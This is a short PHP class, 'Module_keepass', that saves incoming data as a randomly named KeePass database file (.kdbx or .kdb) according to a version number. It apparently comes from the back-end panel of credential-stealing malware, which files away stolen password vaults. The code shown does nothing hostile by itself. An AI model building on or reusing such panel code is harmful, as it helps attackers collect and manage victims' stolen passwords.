<?php

	class Module_keepass extends Module_
	{
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
				{
					$this->insert_downloads(MakeRandomString(10, TRUE) . ".kdbx",  $Data);
					break;
				}
				case 1:
				{
					$this->insert_downloads(MakeRandomString(10, TRUE) . ".kdb",  $Data);
					break;
				}
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}
